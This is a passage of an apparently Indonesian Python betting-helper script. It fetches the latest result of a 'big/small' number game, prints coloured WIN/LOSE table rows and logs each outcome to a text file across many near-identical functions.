    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    ee = open("Num.txt", 'r')
    f = ee.read()
    if f > '3' and f < '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK1/3 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX5()
    elif f < '1':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK1/3 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX5()
    elif f > '1' and f < '3':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK1/3 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX5()
    elif f > '0' and f < '2':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK1/3 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX5()
    elif f > '2' and f < '4':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK1/3 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX5()
    elif f > '4':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK1/3 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {H}  LOSE  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX5()
			 
def taruhanbesarX4 ():
    data = {
    'typeid' : '1',
    'pageno' : '1',
    'language' : 'id'
    }
    gameissue()
    countdownTimerX4B()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    ee = open("Num.txt", 'r')
    f = ee.read()
    if f > '7':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB6/7 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX5()
    elif f > '4' and f < '6':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB6/7 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX5()
    elif f > '5' and f < '8':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB6/7 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX5()
    elif f < '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB6/7 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {H}  LOSE  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX5()
			 
def auto_besarX5 ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    print(f'{G}•{taruhanbesarX5()}')


def auto_kecilX5 ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['0','1','2','3','4']
    m = ['0','1','2','3','4']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['46%','51%','50%','54%','61%','63%','65%','78%','75%','89%','97%']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    print(f'{G}{taruhankecilX5()}')
			
def taruhankecilX5 ():
    data = {
    'typeid' : '1',
    'pageno' : '1',
    'language' : 'id'
    }
    gameissue()
    countdownTimerX5K()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    session = requests.Session()
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    ee = open("Num.txt", 'r')
    f = ee.read()
    if f < '2':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK2/3 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX6()
    elif f > '3' and f < '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK2/3 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX6()
    elif f > '1' and f < '4':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK2/3 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX6()
    elif f > '4':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK2/3 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {H}  LOSE  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX6()
			 
def taruhanbesarX5 ():
    data = {
    'typeid' : '1',
    'pageno' : '1',
    'language' : 'id'
    }
    gameissue()
    countdownTimerX5B()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    session = requests.Session()
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    ee = open("Num.txt", 'r')
    f = ee.read()
    if f > '4' and f < '8':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB8/9 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX6()
    elif f > '7':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB8/9 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX6()
    elif f < '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB8/9 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {H}  LOSE  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX6()


def auto_besarX6 ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    print(f'{G}•{taruhanbesarX6()}')


def auto_kecilX6 ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['0','1','2','3','4']
    m = ['0','1','2','3','4']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['46%','51%','50%','54%','61%','63%','65%','78%','75%','89%','97%']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    print(f'{G}{taruhankecilX6()}')
			
def taruhankecilX6 ():
    data = {
    'typeid' : '1',
    'pageno' : '1',
    'language' : 'id'
    }
    gameissue()
    countdownTimerX6K()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    ee = open("Num.txt", 'r')
    f = ee.read()
    if f > '0' and f < '3':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK0/3 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX7()
    elif f > '3' and f < '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK0/3 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX7()
    elif f > '2' and f < '4':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK0/3 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX7()
    elif f < '1':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK0/3 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW2}  JP{L}{CY}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX7()
    elif f > '4':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK0/3 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {H}  LOSE  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX7()
			 
def taruhanbesarX6 ():
    data = {
    'typeid' : '1',
    'pageno' : '1',
    'language' : 'id'
    }
    gameissue()
    countdownTimerX6B()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    # session = requests.Session()
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    ee = open("Num.txt", 'r')
    f = ee.read()
    if f > '4' and f < '6':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB6/7 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX7()
    elif f > '7':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB6/7 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX7()
    elif f > '5' and f < '8':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB6/7 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX7()
    elif f < '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB6/7 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {H}  LOSE  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX7()
			 
			 
def auto_besarX7 ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    print(f'{G}•{taruhanbesarX7()}')


def auto_kecilX7 ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['0','1','2','3','4']
    m = ['0','1','2','3','4']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['46%','51%','50%','54%','61%','63%','65%','78%','75%','89%','97%']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    print(f'{G}{taruhankecilX7()}')
			
def taruhankecilX7 ():
    data = {
    'typeid' : '1',
    'pageno' : '1',
    'language' : 'id'
    }
    gameissue()
    countdownTimerX7K()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    session = requests.Session()
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    ee = open("Num.txt", 'r')
    f = ee.read()
    if f < '2':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK2/3 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX1()
    elif f > '3' and f < '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK2/3 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX1()
    elif f > '1' and f < '4':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK2/3 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX1()
    elif f > '4':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK2/3 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {H}  LOSE  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX1()
			 
def taruhanbesarX7 ():
    data = {
    'typeid' : '1',
    'pageno' : '1',
    'language' : 'id'
    }
    gameissue()
    countdownTimerX7B()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    # session = requests.Session()
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    ee = open("Num.txt", 'r')
    f = ee.read()
    if f > '5' and f < '8':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB5/8 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX1()
    elif f > '8':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB5/8 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX1()
    elif f > '4' and f < '6':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB5/8 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW2}  JP{L}{CY}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX1()
    elif f > '7' and f < '9':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB5/8 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX1()
    elif f < '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB5/8 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {H}  LOSE  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX1()
			 
			 
def auto_besarX8 ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    print(f'{G}•{taruhanbesarX8()}')


def auto_kecilX8 ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['0','1','2','3','4']
    m = ['0','1','2','3','4']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['46%','51%','50%','54%','61%','63%','65%','78%','75%','89%','97%']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    print(f'{G}{taruhankecilX8()}')
			
def taruhankecilX8 ():
    data = {
    'typeid' : '1',
    'pageno' : '1',
    'language' : 'id'
    }
    gameissue()
    countdownTimerX8K()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    # session = requests.Session()
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    ee = open("Num.txt", 'r')
    f = ee.read()
    if f < '3':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK3/4 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi1()
    elif f > '2' and f < '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK3/4 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi1()
    elif f > '4':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK3/4 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {H}  LOSE  {L} {G}┃')
        with open("winlose.txt",'a') as g:
